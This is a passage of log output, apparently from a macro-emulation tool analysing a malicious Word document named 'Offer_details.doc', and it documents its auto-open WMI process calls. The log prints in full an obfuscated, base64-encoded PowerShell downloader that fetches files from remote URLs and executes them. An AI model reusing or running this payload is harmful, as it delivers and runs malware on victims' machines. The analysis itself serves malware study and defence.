aAB0AHQATQBCADIAeABdAFsAIAAoADAAIABoAHUAQgBKACAAWwBdACAAWwBdAE0AcABzADoATQBCADIAeABdAFsAIAAoADAAIABoAHUAQgBKACAAWwBdACAAWwBdAE0ALwAvAGcATQBCADIAeABdAFsAIAAoADAAIABoAHUAQgBKACAAWwBdACAAWwBdAE0AaQB0AGgATQBCADIAeABdAFsAIAAoADAAIABoAHUAQgBKACAAWwBdACAAWwBdAE0AdQBiAC4ATQBCADIAeABdAFsAIAAoADAAIABoAHUAQgBKACAAWwBdACAAWwBdAE0AYwBvAG0ATQBCADIAeABdAFsAIAAoADAAIABoAHUAQgBKACAAWwBdACAAWwBdAE0ALwBqAG8ATQBCADIAeABdAFsAIAAoADAAIABoAHUAQgBKACAAWwBdACAAWwBdAE0AZQB6AGkATQBCADIAeABdAFsAIAAoADAAIABoAHUAQgBKACAAWwBdACAAWwBdAE0AZAAvAGoATQBCADIAeABdAFsAIAAoADAAIABoAHUAQgBKACAAWwBdACAAWwBdAE0AbwBlAHoATQBCADIAeABdAFsAIAAoADAAIABoAHUAQgBKACAAWwBdACAAWwBdAE0AaQBkAC4ATQBCADIAeABdAFsAIAAoADAAIABoAHUAQgBKACAAWwBdACAAWwBdAE0AZwBpAHQATQBCADIAeABdAFsAIAAoADAAIABoAHUAQgBKACAAWwBdACAAWwBdAE0AaAB1AGIATQBCADIAeABdAFsAIAAoADAAIABoAHUAQgBKACAAWwBdACAAWwBdAE0ALgBpAG8ATQBCADIAeABdAFsAIAAoADAAIABoAHUAQgBKACAAWwBdACAAWwBdAE0ALwByAGEATQBCADIAeABdAFsAIAAoADAAIABoAHUAQgBKACAAWwBdACAAWwBdAE0AdwAvAG0ATQBCADIAeABdAFsAIAAoADAAIABoAHUAQgBKACAAWwBdACAAWwBdAE0AYQBpAG4ATQBCADIAeABdAFsAIAAoADAAIABoAHUAQgBKACAAWwBdACAAWwBdAE0ALwBJAG0ATQBCADIAeABdAFsAIAAoADAAIABoAHUAQgBKACAAWwBdACAAWwBdAE0AYQBnAGUATQBCADIAeABdAFsAIAAoADAAIABoAHUAQgBKACAAWwBdACAAWwBdAE0AcwAvAFcATQBCADIAeABdAFsAIAAoADAAIABoAHUAQgBKACAAWwBdACAAWwBdAE0AZQBpAHIATQBCADIAeABdAFsAIAAoADAAIABoAHUAQgBKACAAWwBdACAAWwBdAE0AZABvAC4ATQBCADIAeABdAFsAIAAoADAAIABoAHUAQgBKACAAWwBdACAAWwBdAE0AcABuAGcATQBCADIAeAAnAC4AIgBSAGUAcABMAEEAYABjAEUAIgAoACgAJwBdAFsAIAAoADAAIABoAHUAQgBKACAAWwBdACAAWwBdAE0AJwApACwAJwAnACkALgAiAFIAZQBwAEwAQQBgAGMARQAiACgAKAAnAE0AQgAyAHgAJwApACwAJwAnACkAOwAkAEkAMwAxAGgANABzAF8APQAoACgAJwBXADYAJwArACcANAA5ACcAKQArACcAcABnACcAKwAnAGIAJwApADsAZgBvAHIAZQBhAGMAaAAgACgAJABYAGQAeABmAGQAMABiACAAaQBuACAAJABHAGwANgBnADUANwBlACkAewB0AHIAeQB7ACQAWgBnAGwAYQA1AGEAcgAuACIAZABPAFcATgBMAGAATwBhAEQARgBJAGAATABlACIAKAAkAFgAZAB4AGYAZAAwAGIALAAgACQAWQA3AGUAZABuAGwAMgApADsAJABGAHIAMgB5AGQAbAAyAD0AKAAoACcATAAzAGQAJwArACcANgA5ADIAJwApACsAJwBnACcAKQA7AEkAZgAgACgAKAAmACgAJwBHAGUAJwArACcAdAAtAEkAdAAnACsAJwBlAG0AJwApACAAJABZADcAZQBkAG4AbAAyACkALgAiAEwAYABlAG4AZwBgAFQASAAiACAALQBnAGUAIAAxADIAMgA4ADgAMAApACAAewAoAFsAdwBtAGkAYwBsAGEAcwBzAF0AKAAnAHcAJwArACcAaQBuACcAKwAnADMAJwArACgAJwAyACcAKwAnAF8AUAByAG8AJwApACsAKAAnAGMAZQBzACcAKwAnAHMAJwApACkAKQAuACIAQwBSAGAARQBBAFQAZQAiACgAJABZADcAZQBkAG4AbAAyACkAOwAkAFQAdgBkAHoAZgA4AGcAPQAoACgAJwBPAHUAJwArACcAZQAnACkAKwAnAGgAegAnACsAJwB0AGsAJwApADsAYgByAGUAYQBrADsAJABJADcAcgB5AGEAdQBhAD0AKAAnAEcAJwArACgAJwAyAGIAJwArACcAbwBlADcAJwApACsAJwBlACcAKQB9AH0AYwBhAHQAYwBoAHsAfQB9ACQAQgA3AHoAdwAwAHkAYgA9ACgAKAAnAE8AJwArACcAawB0ADMAJwApACsAJwB3ACcAKwAnAGoAMgAnACkA]wAE', 'NULL', 'winmgmt:win32_processtartup'] - Interesting Function Call
+WARNING  Function 'Create' not found
+WARNING  Variable 'gdgsFFR' not found
+INFO     calling Function: Pyp8y812nivd8y3zx('NULL')
+WARNING  Variable 'SBGRRDI' not found
+WARNING  Variable 'LKrMAG' not found
+WARNING  Variable 'SBGRRDI' not found
+WARNING  Variable 'fRmtRvAH' not found
+INFO     calling Function: Int([7], {})
+WARNING  Variable 'EtJOABGL' not found
+WARNING  Variable 'SBGRRDI' not found
+WARNING  Variable 'tdWGIo' not found
+INFO     calling Function: Pyp8y812nivd8y3zx('NULL')
+WARNING  Variable 'IdkYJMEEY' not found
+WARNING  Variable 'sweYJIG' not found
+WARNING  Variable 'IdkYJMEEY' not found
+WARNING  Variable 'tdrCJuzJ' not found
+INFO     calling Function: Int([752], {})
+WARNING  Variable 'vrBTICH' not found
+WARNING  Variable 'IdkYJMEEY' not found
+WARNING  Variable 'NPqvBC' not found
+INFO     calling Function: Pyp8y812nivd8y3zx('NULL')
+WARNING  Variable 'StYyiGHcB' not found
+WARNING  Variable 'vSoAGFAEE' not found
+WARNING  Variable 'StYyiGHcB' not found
+WARNING  Variable 'jXNOE' not found
+INFO     calling Function: Int([2], {})
+WARNING  Variable 'RznGSJPBy' not found
+WARNING  Variable 'StYyiGHcB' not found
+WARNING  Variable 'EjYrMlDh' not found
+INFO     calling Function: Pyp8y812nivd8y3zx('NULL')
+WARNING  Variable 'jlwAJn' not found
+WARNING  Variable 'HUlfHE' not found
+WARNING  Variable 'jlwAJn' not found
+WARNING  Variable 'ZGwKA' not found
+INFO     calling Function: Int([7962], {})
+WARNING  Variable 'ywqhU' not found
+WARNING  Variable 'jlwAJn' not found
+
+Recorded Actions:
++-------------------+---------------------------+---------------------------+
+| Action            | Parameters                | Description               |
++-------------------+---------------------------+---------------------------+
+| Found Entry Point | document_open             |                           |
+| CreateObject      | ['winmgmt:win32_Process'] | Interesting Function Call |
+| CreateObject      | ['winmgmt:win32_Processta | Interesting Function Call |
+|                   | rtuP']                    |                           |
+| Create            | ['0 huBJ []               | Interesting Function Call |
+|                   | []wpowershell.exe -ENCOD  |                           |
+|                   | cwBFAHQALQBJAHQARQBNACAAd |                           |
+|                   | gBhAHIASQBBAEIATABlADoATg |                           |
+|                   | A1ADkATwBtACAAIAAoACAAWwB |                           |
+|                   | 0AFkAcABFAF0AKAAiAHsAMQB9 |                           |
+|                   | AHsANAB9AHsAMAB9AHsAMgB9A |                           |
+|                   | HsAMwB9AHsANQB9ACIALQBGAC |                           |
+|                   | AAJwBtAC4ASQAnACwAJwBTAHk |                           |
+|                   | AJwAsACcAbwAuAGQAaQAnACwA |                           |
+|                   | JwByAGUAYwB0AG8AUgAnACwAJ |                           |
+|                   | wBTAFQAZQAnACwAJwBZACcAKQ |                           |
+|                   | ApACAAOwBzAEUAVAAgACgAJwB |                           |
+|                   | 4ADIAJwArACcAaQAnACkAIAAo |                           |
+|                   | AFsAdABZAHAARQBdACgAIgB7A |                           |
+|                   | DUAfQB7ADQAfQB7ADMAfQB7AD |                           |
+|                   | EAfQB7ADIAfQB7ADAAfQB7ADY |                           |
+|                   | AfQAiACAALQBmACAAJwBBACcA |                           |
+|                   | LAAnAEkAYwBFAHAATwBJACcAL |                           |
+|                   | AAnAG4AdABNACcALAAnAFYAJw |                           |
+|                   | AsACcAcgAnACwAJwBTAFkAcwB |                           |
+|                   | 0AGUATQAuAG4ARQBUAC4AcwBF |                           |
+|                   | ACcALAAnAG4AQQBHAGUAUgAnA |                           |
+|                   | CkAIAApACAAOwAkAFIAdQBzAH |                           |
+|                   | YAYwB4AHYAPQAoACcAVQBsACc |                           |
+|                   | AKwAoACcAMQAnACsAJwBwADIA |                           |
+|                   | cAAwACcAKQApADsAJABLADAAd |                           |
+|                   | QBsAHAAbgBlAD0AJABUADAAMA |                           |
+|                   | AzADgAcgBnACAAKwAgAFsAYwB |                           |
+|                   | oAGEAcgBdACgANgA0ACkAIAAr |                           |
+|                   | ACAAJABFADkANgBtAGsAZgA4A |                           |
+|                   | DsAJABaAHcAeAA2ADYAdAAwAD |                           |
+|                   | 0AKAAoACcASQA5AGYAJwArACc |                           |
+|                   | AdgAnACkAKwAoACcAeAAnACsA |                           |
+|                   | JwAwAGgAJwApACkAOwAoACAAI |                           |
+|                   | ABnAEUAdAAtAFYAQQBSAEkAYQ |                           |
+|                   | BiAGwARQAgACAATgA1ADkATwB |                           |
+|                   | NACAALQB2AGEAbAB1AGUATwBu |                           |
+|                   | AGwAeQApADoAOgAiAEMAYABSA |                           |
+|                   | GUAQQBUAGAARQBEAEkAcgBlAG |                           |
+|                   | AAYwBgAFQAbwBSAHkAIgAoACQ |                           |
+|                   | ASABPAE0ARQAgACsAIAAoACgA |                           |
+|                   | KAAnAG0AJwArACcAdAB6AEQAO |                           |
+|                   | AAnACsAJwBjADkAOABuACcAKQ |                           |
+|                   | ArACcAbgAnACsAKAAnAG0AdAB |                           |
+|                   | 6AE8AcwAnACsAJwBzACcAKQAr |                           |
+|                   | ACcAMAAnACsAKAAnADgAYgBfA |                           |
+|                   | CcAKwAnAG0AdAB6ACcAKQApAC |                           |
+|                   | 0AcgBlAFAATABBAEMARQAgACA |                           |
+|                   | AKABbAEMASABhAFIAXQAxADAA |                           |
+|                   | OQArAFsAQwBIAGEAUgBdADEAM |                           |
+|                   | QA2ACsAWwBDAEgAYQBSAF0AMQ |                           |
+|                   | AyADIAKQAsAFsAQwBIAGEAUgB |                           |
+|                   | dADkAMgApACkAOwAkAE8AZwBo |                           |
+|                   | ADkAZABpAGMAPQAoACcASgBoA |                           |
+|                   | CcAKwAoACcAcABmADMAJwArAC |                           |
+|                   | cAaQAnACkAKwAnADYAJwApADs |                           |
+|                   | AKAAgAFYAQQByAGkAQQBiAEwA |                           |
+|                   | RQAgACAAKAAnAFgAMgAnACsAJ |                           |
+|                   | wBpACcAKQAgAC0AVgBhAGwAVQ |                           |
+|                   | BlACkAOgA6ACIAcwBgAGUAQwB |                           |
+|                   | gAFUAUgBpAHQAeQBgAHAAUgBP |                           |
+|                   | AFQATwBDAE8AbAAiACAAPQAgA |                           |
+|                   | CgAKAAnAFQAJwArACcAbABzAC |                           |
+|                   | cAKQArACcAMQAyACcAKQA7ACQ |                           |
+|                   | ASwBtAHEAZQA0AGQAcgA9ACgA |                           |
+|                   | JwBaAHEAJwArACgAJwBxACcAK |                           |
+|                   | wAnADAAbQB2ACcAKQArACcAeQ |                           |
+|                   | AnACkAOwAkAFIANwBfAGMAeQA |                           |
+|                   | wAHAAIAA9ACAAKAAnAFQAJwAr |                           |
+|                   | ACgAJwAxADQAJwArACcAZQAnA |                           |
+|                   | CkAKwAnADAAMAAnACkAOwAkAF |                           |
+|                   | QAdQBwAHIAeABlADUAPQAoACg |                           |
+|                   | AJwBCACcAKwAnAGMAcgAnACkA |                           |
+|                   | KwAoACcAZwAnACsAJwBrAHMAY |                           |
+|                   | wAnACkAKQA7ACQATAB6ADAAMA |                           |
+|                   | B4ADQAZAA9ACgAJwBVACcAKwA |                           |
+|                   | oACcAdQBnAHAAJwArACcAYgBx |                           |
+|                   | ADIAJwApACkAOwAkAFkANwBlA |                           |
+|                   | GQAbgBsADIAPQAkAEgATwBNAE |                           |
+|                   | UAKwAoACgAJwB7ADAAfQBEACc |                           |
+|                   | AKwAoACcAOAAnACsAJwBjADkA |                           |
+|                   | JwApACsAJwA4AG4AbgB7ACcAK |                           |
+|                   | wAnADAAfQBPAHMAJwArACcAcw |                           |
+|                   | AwADgAYgBfAHsAJwArACcAMAB |                           |
+|                   | 9ACcAKQAtAEYAIABbAEMASABB |                           |
+|                   | AFIAXQA5ADIAKQArACQAUgA3A |                           |
+|                   | F8AYwB5ADAAcAArACgAKAAnAC |                           |
+|                   | 4AJwArACcAZQB4ACcAKQArACc |                           |
+|                   | AZQAnACkAOwAkAEwAYwB6AHYA |                           |
+|                   | bgB4ADUAPQAoACcARQAxACcAK |                           |
+|                   | wAnAG4AOAAnACsAKAAnADYAJw |                           |
+|                   | ArACcAcABuACcAKQApADsAJAB |                           |
+|                   | aAGcAbABhADUAYQByAD0ALgAo |                           |
+|                   | ACcAbgBlAHcALQBvAGIAagAnA |                           |
+|                   | CsAJwBlAGMAJwArACcAdAAnAC |                           |
+|                   | kAIABuAGUAVAAuAFcAZQBCAGM |                           |
+|                   | ATABJAGUATgBUADsAJABHAGwA |                           |
+|                   | NgBnADUANwBlAD0AJwBdAFsAI |                           |
+|                   | AAoADAAIABoAHUAQgBKACAAWw |                           |
+|                   | BdACAAWwBdAE0AaAB0AHQATQB |                           |
+|                   | CADIAeABdAFsAIAAoADAAIABo |                           |
+|                   | AHUAQgBKACAAWwBdACAAWwBdA |                           |
+|                   | E0AcABzADoATQBCADIAeABdAF |                           |
+|                   | sAIAAoADAAIABoAHUAQgBKACA |                           |
+|                   | AWwBdACAAWwBdAE0ALwAvAGcA |                           |
+|                   | TQBCADIAeABdAFsAIAAoADAAI |                           |
+|                   | ABoAHUAQgBKACAAWwBdACAAWw |                           |
+|                   | BdAE0AaQB0AGgATQBCADIAeAB |                           |
+|                   | dAFsAIAAoADAAIABoAHUAQgBK |                           |
+|                   | ACAAWwBdACAAWwBdAE0AdQBiA |                           |
+|                   | C4ATQBCADIAeABdAFsAIAAoAD |                           |
+|                   | AAIABoAHUAQgBKACAAWwBdACA |                           |
+|                   | AWwBdAE0AYwBvAG0ATQBCADIA |                           |
+|                   | eABdAFsAIAAoADAAIABoAHUAQ |                           |
+|                   | gBKACAAWwBdACAAWwBdAE0ALw |                           |
+|                   | BqAG8ATQBCADIAeABdAFsAIAA |                           |
+|                   | oADAAIABoAHUAQgBKACAAWwBd |                           |
+|                   | ACAAWwBdAE0AZQB6AGkATQBCA |                           |
+|                   | DIAeABdAFsAIAAoADAAIABoAH |                           |
+|                   | UAQgBKACAAWwBdACAAWwBdAE0 |                           |
+|                   | AZAAvAGoATQBCADIAeABdAFsA |                           |
+|                   | IAAoADAAIABoAHUAQgBKACAAW |                           |
+|                   | wBdACAAWwBdAE0AbwBlAHoATQ |                           |
+|                   | BCADIAeABdAFsAIAAoADAAIAB |                           |
+|                   | oAHUAQgBKACAAWwBdACAAWwBd |                           |
+|                   | AE0AaQBkAC4ATQBCADIAeABdA |                           |
+|                   | FsAIAAoADAAIABoAHUAQgBKAC |                           |
+|                   | AAWwBdACAAWwBdAE0AZwBpAHQ |                           |
+|                   | ATQBCADIAeABdAFsAIAAoADAA |                           |
+|                   | IABoAHUAQgBKACAAWwBdACAAW |                           |
+|                   | wBdAE0AaAB1AGIATQBCADIAeA |                           |
+|                   | BdAFsAIAAoADAAIABoAHUAQgB |                           |
+|                   | KACAAWwBdACAAWwBdAE0ALgBp |                           |
+|                   | AG8ATQBCADIAeABdAFsAIAAoA |                           |
+|                   | DAAIABoAHUAQgBKACAAWwBdAC |                           |
+|                   | AAWwBdAE0ALwByAGEATQBCADI |                           |
+|                   | AeABdAFsAIAAoADAAIABoAHUA |                           |
+|                   | QgBKACAAWwBdACAAWwBdAE0Ad |                           |
+|                   | wAvAG0ATQBCADIAeABdAFsAIA |                           |
+|                   | AoADAAIABoAHUAQgBKACAAWwB |                           |
+|                   | dACAAWwBdAE0AYQBpAG4ATQBC |                           |
+|                   | ADIAeABdAFsAIAAoADAAIABoA |                           |
+|                   | HUAQgBKACAAWwBdACAAWwBdAE |                           |
+|                   | 0ALwBJAG0ATQBCADIAeABdAFs |                           |
+|                   | AIAAoADAAIABoAHUAQgBKACAA |                           |
+|                   | WwBdACAAWwBdAE0AYQBnAGUAT |                           |
+|                   | QBCADIAeABdAFsAIAAoADAAIA |                           |
+|                   | BoAHUAQgBKACAAWwBdACAAWwB |                           |
+|                   | dAE0AcwAvAFcATQBCADIAeABd |                           |
+|                   | AFsAIAAoADAAIABoAHUAQgBKA |                           |
+|                   | CAAWwBdACAAWwBdAE0AZQBpAH |                           |
+|                   | IATQBCADIAeABdAFsAIAAoADA |                           |
+|                   | AIABoAHUAQgBKACAAWwBdACAA |                           |
+|                   | WwBdAE0AZABvAC4ATQBCADIAe |                           |
+|                   | ABdAFsAIAAoADAAIABoAHUAQg |                           |
+|                   | BKACAAWwBdACAAWwBdAE0AcAB |                           |
+|                   | uAGcATQBCADIAeAAnAC4AIgBS |                           |
+|                   | AGUAcABMAEEAYABjAEUAIgAoA |                           |
+|                   | CgAJwBdAFsAIAAoADAAIABoAH |                           |
+|                   | UAQgBKACAAWwBdACAAWwBdAE0 |                           |
+|                   | AJwApACwAJwAnACkALgAiAFIA |                           |
+|                   | ZQBwAEwAQQBgAGMARQAiACgAK |                           |
+|                   | AAnAE0AQgAyAHgAJwApACwAJw |                           |
+|                   | AnACkAOwAkAEkAMwAxAGgANAB |                           |
+|                   | zAF8APQAoACgAJwBXADYAJwAr |                           |
+|                   | ACcANAA5ACcAKQArACcAcABnA |                           |
+|                   | CcAKwAnAGIAJwApADsAZgBvAH |                           |
+|                   | IAZQBhAGMAaAAgACgAJABYAGQ |                           |
+|                   | AeABmAGQAMABiACAAaQBuACAA |                           |
+|                   | JABHAGwANgBnADUANwBlACkAe |                           |
+|                   | wB0AHIAeQB7ACQAWgBnAGwAYQ |                           |
+|                   | A1AGEAcgAuACIAZABPAFcATgB |                           |
+|                   | MAGAATwBhAEQARgBJAGAATABl |                           |
+|                   | ACIAKAAkAFgAZAB4AGYAZAAwA |                           |
+|                   | GIALAAgACQAWQA3AGUAZABuAG |                           |
+|                   | wAMgApADsAJABGAHIAMgB5AGQ |                           |
+|                   | AbAAyAD0AKAAoACcATAAzAGQA |                           |
+|                   | JwArACcANgA5ADIAJwApACsAJ |                           |
+|                   | wBnACcAKQA7AEkAZgAgACgAKA |                           |
+|                   | AmACgAJwBHAGUAJwArACcAdAA |                           |
+|                   | tAEkAdAAnACsAJwBlAG0AJwAp |                           |
+|                   | ACAAJABZADcAZQBkAG4AbAAyA |                           |
+|                   | CkALgAiAEwAYABlAG4AZwBgAF |                           |
+|                   | QASAAiACAALQBnAGUAIAAxADI |                           |
+|                   | AMgA4ADgAMAApACAAewAoAFsA |                           |
+|                   | dwBtAGkAYwBsAGEAcwBzAF0AK |                           |
+|                   | AAnAHcAJwArACcAaQBuACcAKw |                           |
+|                   | AnADMAJwArACgAJwAyACcAKwA |                           |
+|                   | nAF8AUAByAG8AJwApACsAKAAn |                           |
+|                   | AGMAZQBzACcAKwAnAHMAJwApA |                           |
+|                   | CkAKQAuACIAQwBSAGAARQBBAF |                           |
+|                   | QAZQAiACgAJABZADcAZQBkAG4 |                           |
+|                   | AbAAyACkAOwAkAFQAdgBkAHoA |                           |
+|                   | ZgA4AGcAPQAoACgAJwBPAHUAJ |                           |
+|                   | wArACcAZQAnACkAKwAnAGgAeg |                           |
+|                   | AnACsAJwB0AGsAJwApADsAYgB |                           |
+|                   | yAGUAYQBrADsAJABJADcAcgB5 |                           |
+|                   | AGEAdQBhAD0AKAAnAEcAJwArA |                           |
+|                   | CgAJwAyAGIAJwArACcAbwBlAD |                           |
+|                   | cAJwApACsAJwBlACcAKQB9AH0 |                           |
+|                   | AYwBhAHQAYwBoAHsAfQB9ACQA |                           |
+|                   | QgA3AHoAdwAwAHkAYgA9ACgAK |                           |
+|                   | AAnAE8AJwArACcAawB0ADMAJw |                           |
+|                   | ApACsAJwB3ACcAKwAnAGoAMgA |                           |
+|                   | nACkA]wAE', 'NULL', 'winm |                           |
+|                   | gmt:win32_processtartup'] |                           |
++-------------------+---------------------------+---------------------------+
+
+INFO     Found 2 possible IOCs. Stripping duplicates...
+VBA Builtins Called: ['BuildKeyCode', 'CVar', 'Chr', 'Cos', 'Create', 'CreateObject', 'Int', 'Item', 'Mid', 'Replace']
+
+Finished analyzing Offer_details.doc .
